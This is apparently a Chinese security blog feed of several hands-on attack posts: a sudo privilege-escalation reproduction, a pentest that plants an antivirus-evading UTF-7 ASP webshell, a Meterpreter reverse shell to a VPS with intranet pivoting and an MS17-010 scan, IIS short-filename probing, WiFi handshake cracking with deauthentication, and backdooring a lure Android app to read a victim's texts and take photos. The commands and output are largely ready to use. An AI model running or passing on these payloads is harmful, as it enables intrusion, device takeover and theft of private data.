        <content type="html"><![CDATA[<p>漏洞ID：CVE-2019-14287</p><p>漏洞公布日期：2019年10月14日</p><p>影响范围：sudo 1.8.28 之前的所有版本</p><p>复现环境：kali</p><p>因为sudo是平时用得较多的一个命令，前两天得知了这个漏洞，就复现一下。</p><a id="more"></a><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>先查看<code>sudo</code>版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -V</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/sudo-1.webp" alt="sudo-1"></p><p><code>sudo</code>版本低于<code>1.8.28</code></p><p>创建一个<code>test</code>用户用于本次测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd test</span><br><span class="line">passwd test</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/sudo-2.webp" alt="sudo-2"></p><p>编辑<code>/etc/sudoers</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/sudo-3.webp" alt="sudo-3"></p><p>添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test ALL = (ALL, !root) /usr/bin/vim</span><br></pre></td></tr></table></figure><p>这里表示用户<code>test</code>以任意非<code>root</code>身份运行<code>/usr/bin/vim</code>，执行<code>vim</code>命令</p><p>如果是直接添加:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test ALL = (ALL, !root) /usr/bin/bash</span><br></pre></td></tr></table></figure><p>是不是就可以直接提权呢？</p><p>以<code>test</code>用户查看本地<code>1</code>文件，显示<code>权限不够</code></p><p><img src="https://oss.zjun.info/zjun.info/sudo-4.webp" alt="sudo-4"></p><p>然后我们输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u#-1 vim</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u#4294967295 vim</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/sudo-5.webp" alt="sudo-5"></p><p>只要用户在使用<code>sudo</code>命令时指定<code>UID</code>为<code>-1</code>或<code>4294967295</code>，就可以以<code>root</code>身份执行命令。这是因为命令在将<code>UID</code>转换为对应用户时，会将<code>-1</code>或<code>4294967295</code>这两个异常数字视为<code>0</code>，而<code>0</code>是<code>root</code>用户的<code>UID</code>，因此可以实现在普通用户下执行<code>root</code>用户权限。</p><p>在<code>vim</code>界面下尝试读取<code>1</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!cat ./1</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/sudo-6.webp" alt="sudo-6"></p><p>读取成功</p><p><img src="https://oss.zjun.info/zjun.info/sudo-7.webp" alt="sudo-7"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞需要实现的话需要<code>root</code>用户在<code>sudoers</code>文件中添加一些非标准的配置，个人认为漏洞影响范围不大，因为一般情况没人会在<code>sudoers</code>中添加这些配置。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> SUDO提权 </tag>
            
            <tag> CVE-2019-14287 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从某公司文件上传到内网漫游</title>
      <link href="2019/from-a-company-file-upload-to-intranet-roaming.html"/>
      <url>2019/from-a-company-file-upload-to-intranet-roaming.html</url>
      
        <content type="html"><![CDATA[<p>首先渗透的站点是有授权的，并且以下触及关键点都有模糊化处理。这个站我拿到的时候就直接是一个文件上传点了，通过对这个站点分析得知应该是由一个文件遍历漏洞找到的文件上传点</p><a id="more"></a><p><img src="https://oss.zjun.info/zjun.info/upload-shell-1.jpg" alt="upload-shell-1"></p><p><img src="https://oss.zjun.info/zjun.info/upload-shell-2.jpg" alt="upload-shell-2"></p><h2 id="上传一句话木马连接shell"><a href="#上传一句话木马连接shell" class="headerlink" title="上传一句话木马连接shell"></a>上传一句话木马连接shell</h2><p>就想着能不能上传一个木马连接shell，尝试上传了普通的asp一句话木马，蚁剑刚测试连接成功就断开，上传页面也显示文件被删除。</p><p>有朋友上传了免杀asp大马感觉用起来不方便，也不稳定，所以就构造asp的免杀一句话木马</p><p>一个密码为”LandGrey”的原始ASP一句话脚本代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@codepage&#x3D;65000%&gt;</span><br><span class="line">&lt;%response.codepage&#x3D;65001:eval(request(&quot;LandGrey&quot;))%&gt;</span><br></pre></td></tr></table></figure><p>参考<a href="https://github.com/LandGrey/webshell-detect-bypass">免杀webshell</a></p><p>UTF-7编码后如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@codepage&#x3D;65000%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">+AHIAZQBzAHAAbwBuAHMAZQAuAGMAbwBkAGUAcABhAGcAZQA9ADYANQAwADAAMQA6AGUAdgBhAGwAKAByAGUAcQB1AGUAcwB0ACgAIgBMAGEAbgBkAEcAcgBlAHkAIgApACk-</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>这种方式可以躲过较多webshell检测软件查杀，但是D盾Webshell查杀工具，提示脚本使用了UTF-7编码，并不能做到完全不被察觉。这里我感觉应该能绕过服务器内的查杀软件了</p><p><img src="https://oss.zjun.info/zjun.info/upload-shell-3.webp" alt="upload-shell-3"></p><p><img src="https://oss.zjun.info/zjun.info/upload-shell-4.webp" alt="upload-shell-4"></p><h2 id="失败的提权过程"><a href="#失败的提权过程" class="headerlink" title="失败的提权过程"></a>失败的提权过程</h2><p>看了下ip发现是内网，用户为iis，尝试提权也失败了</p><p><img src="https://oss.zjun.info/zjun.info/upload-shell-5.webp" alt="upload-shell-5"></p><p>查看运行的服务</p><p><img src="https://oss.zjun.info/zjun.info/upload-shell-6.webp" alt="upload-shell-6"></p><p>存在360杀毒，所以之前的普通一句话木马都被杀了</p><h2 id="内网漫游17-010探测"><a href="#内网漫游17-010探测" class="headerlink" title="内网漫游17-010探测"></a>内网漫游17-010探测</h2><p>在这里我考虑了很久，想打入内网我想到了三种方式。可以直接把数据转发出来本地代理渗透内网，但是目标主机是内网IP，还可以用lcx将内网主机3389端口转发到有公网IP的服务器上，我们再进行远程登陆，但是我没有windows服务器还没有足够的权限去实现，甚至还可以用msf生成木马直接连接，但是想到有360杀毒应该会被杀。</p><p>最后一种方式我试了一下，先在本地kali虚拟机生成一个连接到服务器的msf木马，再转发到本地macos通过蚁剑上传到目标内网windows上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;45.77.124.165 lport&#x3D;1234 -f exe -o red.exe</span><br><span class="line">scp -p red.exe reder@172.22.163.184:~&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/upload-shell-7.webp" alt="upload-shell-7"></p><p>上传成功，竟然没被360杀掉还是比较意外</p><p><img src="https://oss.zjun.info/zjun.info/upload-shell-8.webp" alt="upload-shell-8"></p><p>先通过蚁剑开启该木马再登陆服务器开启msf连接木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 45.77.124.165</span><br><span class="line">set lport 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/upload-shell-9.webp" alt="upload-shell-9"></p><p>接下来就是获取目标网段信息，在MSF平台监听端，我们获取反弹的shell后（即session），我们可以直接在meterpreter控制终端进行目标网段信息的查询，具体查询命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">Local subnet: 10.255.4.0&#x2F;255.255.255.0</span><br></pre></td></tr></table></figure><p>添加目标网段路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 10.255.4.0&#x2F;24</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">[*] Adding a route to 10.255.4.0&#x2F;255.255.255.0...</span><br><span class="line">[+] Added route to 10.255.4.0&#x2F;255.255.255.0 via 218.70.16.163</span><br><span class="line">[*] Use the -p option to list all active routes</span><br></pre></td></tr></table></figure><p>路由查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   10.255.4.0         255.255.255.0      Session 4</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们将去往内网的路由打通后，接下来就可以使用MSF平台直接对内网主机扫描和进行各种高危漏洞的直接渗透利用了。</p><p>首先我们需要退到MSF攻击平台的操作面，为后面调用其他攻击模块做好准备，具体操作如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; sessions -i</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                     Connection</span><br><span class="line">  --  ----  ----                     -----------                     ----------</span><br><span class="line">  4         meterpreter x64&#x2F;windows  IIS APPPOOL\ECI_EEMS @ WEBSRV3  45.77.124.165:1234 -&gt; xx.xx.xx.xx:29007 (10.255.4.3)</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</span><br><span class="line">msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 10.255.4.0&#x2F;24</span><br><span class="line">rhosts &#x3D;&gt; 10.255.4.0&#x2F;24</span><br><span class="line">msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set threads 50</span><br><span class="line">threads &#x3D;&gt; 50</span><br><span class="line">msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/upload-shell-10.webp" alt="upload-shell-10"></p><p>扫描了一下网段内MS17-010漏洞,过主机漏洞扫描，我们发现很多主机都存在MS17-010漏洞。</p><p><img src="https://oss.zjun.info/zjun.info/upload-shell-11.webp" alt="upload-shell-11"></p><h2 id="打完收工"><a href="#打完收工" class="headerlink" title="打完收工"></a>打完收工</h2><p>到了这里我们可以做的事情就比较多了，内网的部分已在掌握。自此我们使用的从传码到”MSF的跳转路由转发”直接使用外网的MSF平台实现对内网私有主机的攻击实战结束。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>后面通过systeminfo查看了入口主机的补丁信息，利用<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>成功利用一处漏洞提权成功。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> Getshell </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS短文件名漏洞分析及一个实例</title>
      <link href="2019/analysis-of-iis-short-file-name-vulnerability.html"/>
      <url>2019/analysis-of-iis-short-file-name-vulnerability.html</url>
      
        <content type="html"><![CDATA[<p>此漏洞实际是由HTTP请求中旧DOS 8.3名称的代字符（〜）波浪号引起的。它允许远程攻击者在Web根目录下公开文件或文件夹名称，这通常是不应该被访问到的。攻击者可以找到通常无法从外部直接访问的重要文件，并获取有关应用程序基础结构的信息。</p><p>为兼容16位MS-DOS程序，Windows为文件名较长的文件（文件夹）生成了对应的windows8.3短文件名。</p><p>并且在Windows下查看对应的短文件名，可以使用命令 dir /x。</p><p><img src="https://oss.zjun.info/zjun.info/iis-1.webp" alt="iis-1"></p><p><strong>实际用处</strong><br> 1、猜后台。<br> 2、猜敏感文件，例如备份的rar、zip、.bak、.SQL文件等。<br> 3、在某些情形下，甚至可以通过短文件名直接下载对应的文件。比如下载备份SQL文件。</p><p><strong>漏洞的局限性</strong><br>1、只能猜解前六位，以及扩展名的前3位。<br>2、名称较短的文件是没有相应的短文件名的。<br>3、需要IIS和.net两个条件都满足。</p><p><strong>漏洞修复</strong><br>1、升级.net framework<br>2、修改注册表键值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem修改NtfsDisable8dot3NameCreation为1。</span><br></pre></td></tr></table></figure><p>3、将web文件夹的内容拷贝到另一个位置，比如<code>D:\www</code>到<code>D:\www.back</code>，然后删除原文件夹<code>D:\www</code>，再重命名<code>D:\www.back</code>到<code>D:\www</code>，如果不重新复制，已经存在的短文件名则是不会消失的。</p><h2 id="IIS短文件名漏洞利用实例"><a href="#IIS短文件名漏洞利用实例" class="headerlink" title="IIS短文件名漏洞利用实例"></a>IIS短文件名漏洞利用实例</h2><p>一个站，密码不是弱口令，还有验证码，自然不好爆破之类</p><p><img src="https://oss.zjun.info/zjun.info/iis-2.webp" alt="iis-2"></p><p>扫描后台结果显示</p><p><img src="https://oss.zjun.info/zjun.info/iis-3.webp" alt="iis-3"></p><p>访问/test.aspx，没什么东西。</p><p>云悉信息搜集显示</p><p><img src="https://oss.zjun.info/zjun.info/iis-5.webp" alt="iis-5"></p><p>Iis7.5和.net都具备了可以考虑一波是否存在iis短文件名漏洞<br>我使用的是李劼杰的工具：<br><a href="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a></p><p><img src="https://oss.zjun.info/zjun.info/iis-6.webp" alt="iis-6"></p><p>扫描结果如下</p><p><img src="https://oss.zjun.info/zjun.info/iis-7.webp" alt="iis-7"></p><p>4个目录，共找到6个文件，现在开始猜解文件名<br>最后猜到/rninde~1.asp*应该是/rnindex.aspx,访问该页面</p><p><img src="https://oss.zjun.info/zjun.info/iis-8.webp" alt="iis-8"></p><p>发现没有了验证码，我们便可以尝试爆破登录等。</p><h2 id="通过这个案例总结一下"><a href="#通过这个案例总结一下" class="headerlink" title="通过这个案例总结一下"></a>通过这个案例总结一下</h2><p>iis短文件名漏洞危害说大也大，说小也小。<br>危害大在于它可以让访问到一些未经授权的网站甚至下载到一些东西。<br>危害小在于猜解文件名有时还真不一定猜得出来，而且不是所以猜解出文件名的页面都有用处。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> IIS短文件名漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux上使用aircrack-ng破解wifi</title>
      <link href="2019/use-aircrack-ng-to-crack-wifi-on-linux.html"/>
      <url>2019/use-aircrack-ng-to-crack-wifi-on-linux.html</url>
      
        <content type="html"><![CDATA[<p>这是一篇写于2018年的文章，首发于CSDN：<br><a href="https://blog.csdn.net/qq_43760866/article/details/86773003%E3%80%82">https://blog.csdn.net/qq_43760866/article/details/86773003。</a><br>使用工具：aircrack-ng<br>环境：deepin linux</p><a id="more"></a><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>虚拟机读取不了笔记本的网卡信息，推荐使用物理机进行操作，或者购买<code>wifi</code>接收器<br>若无此工具要先安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install aircrack-ng</span><br></pre></td></tr></table></figure><p>首先开启网卡监听模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng start wlp2s0</span><br></pre></td></tr></table></figure><p><code>wlp2s0</code>为本机网卡名，可用<code>ifconfig</code>或<code>iwconfig</code>查看</p><p><img src="https://oss.zjun.info/zjun.info/aircrak-ng-linux-1.png" alt="aircrak-ng-linux-1"></p><p>此时卡网被改了名字，上图可见，或则同样<code>ifconfig</code>或<code>iwconfig</code>查看</p><p><img src="https://oss.zjun.info/zjun.info/aircrak-ng-linux-2.png" alt="aircrak-ng-linux-2"></p><p>然后扫描附近<code>wifi</code>信号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airodump-ng wlp2s0mon</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/aircrak-ng-linux-3.png" alt="aircrak-ng-linux-3"></p><p><img src="https://oss.zjun.info/zjun.info/aircrak-ng-linux-4.png" alt="aircrak-ng-linux-4"></p><p><code>注</code>：airodump-ng &lt;你的网卡名称&gt;<br>    • BSSID是AP端的MAC地址<br>    • PWR是信号强度，数字越小越好<br>    • Data是对应的路由器的在线数据吞吐量，数字越大，数据上传量越大。<br>    • CH是对应路由器的所在频道<br>    • ESSID是对应路由器的名称 </p><p>停止扫描后使用<code>airodump-ng</code>监听指定目标频道</p><p><img src="https://oss.zjun.info/zjun.info/aircrak-ng-linux-5.png" alt="aircrak-ng-linux-5"></p><p><code>注</code>：airodump-ng -c &lt;AP的频道&gt; -w &lt;抓取握手包的存放位置&gt; –bssid &lt;AP的MAC地址&gt; &lt;你的网卡名称&gt;</p><p><img src="https://oss.zjun.info/zjun.info/aircrak-ng-linux-6.png" alt="aircrak-ng-linux-6"></p><p>当你获取道握手包时，右上角区域会显示<code>WPA handshake</code>，因为后期截图的原因，这里显示已获取，若没有获取则需要发动攻击，迫使合法的客户端断线，进行重新认证，我们趁机抓包。</p><p>保持上一个终端窗口的运行状态，打开一个新的终端</p><p><img src="https://oss.zjun.info/zjun.info/aircrak-ng-linux-7.png" alt="aircrak-ng-linux-7"></p><p><code>注</code>：aireplay-ng -&lt;攻击模式，我们这里使用 解除认证攻击&gt; [攻击次数，0为无限攻击] -a &lt;AP端的MAC地址&gt; -c &lt;客户端端的MAC地址&gt; &lt;你的网卡名称&gt;</p><p>这里我使用的是解除认证攻击模式，给客户端无限发送测试包使其下线。当你获取到握手包时，可以使用<code>Ctrl + C</code> 停止发送测试包。 </p><p>在你的抓取握手包的存放目录会生成4个文件，握手包文件的拓展名为 <code>.cap</code></p><p><img src="https://oss.zjun.info/zjun.info/aircrak-ng-linux-8.png" alt="aircrak-ng-linux-8"></p><p>现在可关闭监听模式，不关也无影响</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng stop wlp2s0mon</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/aircrak-ng-linux-9.png" alt="aircrak-ng-linux-9"></p><p>并且重启网卡服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start NetworkManager.service</span><br></pre></td></tr></table></figure><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>最后使用字典进行暴力破解,当密码破解成功时，会显示<code>KEY FOUND!</code>字样，中括号为<code>wifi</code>密码。<br><img src="https://oss.zjun.info/zjun.info/aircrak-ng-linux-10.png" alt="aircrak-ng-linux-10"></p><p><code>注</code>：aircrack-ng -w &lt;字典路径&gt; &lt;握手包路径&gt;</p><p><code>wpa/wpa2</code>的密码破解完全靠运气，但是一个强大字典是肯定可以提高破解的成功几率。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 无线渗透 </tag>
            
            <tag> 破解WIFI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>外网安卓木马远控</title>
      <link href="2019/external-network-android-trojan-remote-control.html"/>
      <url>2019/external-network-android-trojan-remote-control.html</url>
      
        <content type="html"><![CDATA[<p>vps服务器：144.202.119.151<br>虚拟机kali ip：172.23.211.103<br>本机macos ip：172.23.211.86<br>外网安卓手机：安卓6.0 <del>（安卓全版本通杀）</del> </p><a id="more"></a><h2 id="构造带有后门的app"><a href="#构造带有后门的app" class="headerlink" title="构造带有后门的app"></a>构造带有后门的app</h2><p>先在网上找一个小巧的并带有诱惑的软件，比如wifi破解王</p><p><img src="https://oss.zjun.info/zjun.info/andmu-1.webp" alt="andmu-1"></p><p>使用backdoor-apk制作apk</p><p>项目地址：<a href="https://github.com/dana-at-cp/backdoor-apk">https://github.com/dana-at-cp/backdoor-apk</a></p><p>将wifi破解王移动到backdoor-apk-master/backdoor-apk目录中并构造后门</p><p><img src="https://oss.zjun.info/zjun.info/andmu-2.webp" alt="andmu-2"></p><p>制作好的apk文件在original/dist目录下找到</p><p><strong>将后门软件上传至服务器，并生成下载链接二维码</strong></p><p><img src="https://oss.zjun.info/zjun.info/andmu-3.webp" alt="andmu-3"></p><p><img src="https://oss.zjun.info/zjun.info/andmu-4.webp" alt="andmu-4"></p><p><img src="https://oss.zjun.info/zjun.info/andmu-5.webp" alt="andmu-5"></p><p><strong>手机扫码下载该软件，并赋予权限</strong></p><img src="https://oss.zjun.info/zjun.info/andmu-6.webp" height="330" width="190" ><p>可以发现手机并未报毒，成功安装后运行该软件</p><h2 id="vps利用msf连接后门"><a href="#vps利用msf连接后门" class="headerlink" title="vps利用msf连接后门"></a>vps利用msf连接后门</h2><p>获取手机系统版本信息</p><p><img src="https://oss.zjun.info/zjun.info/andmu-7.webp" alt="andmu-7"></p><p>查看手机短信</p><p><img src="https://oss.zjun.info/zjun.info/andmu-8.webp" alt="andmu-8"></p><p><img src="https://oss.zjun.info/zjun.info/20210217113513.png" alt="andmu-9"></p><p>利用手机后置摄像头拍照（某些手机只支持后置或前置拍照）</p><p><img src="https://oss.zjun.info/zjun.info/andmu-10.webp" alt="andmu-10"></p><p><img src="https://oss.zjun.info/zjun.info/20210217123119.png" alt="image-20210217123118592"></p><p>控制手机向指定号码发送短信，终端中文乱码但是不影响</p><p><img src="https://oss.zjun.info/zjun.info/andmu-12.webp" alt="andmu-12"></p><p>指定号码成功接收短信</p><p><img src="https://oss.zjun.info/zjun.info/andmu-13.webp" alt="andmu-13"></p><p>更多的指令可以参考</p><p><img src="https://oss.zjun.info/zjun.info/andmu-14.webp" alt="andmu-14"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓木马 </tag>
            
            <tag> Backdoor-Apk </tag>
            
            <tag> 远程监听 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
